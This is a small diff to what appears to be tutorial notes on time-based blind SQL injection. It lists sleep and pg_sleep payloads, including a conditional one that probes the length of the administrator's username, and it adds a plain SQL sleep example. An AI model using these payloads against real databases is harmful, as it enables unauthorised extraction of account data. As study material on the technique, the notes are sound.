@@ -125,7 +125,7 @@ This technique makes the database pause for a set amount of time, which helps de
 '||sleep(10)||'  
 '||(SELECT sleep(10))||'  
 '||(SELECT pg_sleep(10))||'  
-
+select * from users where username = 'carlos' and sleep(5);
 '||(SELECT CASE WHEN ((SELECT LENGTH(username) FROM users WHERE username='administrator')=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)||'  
 ```
 
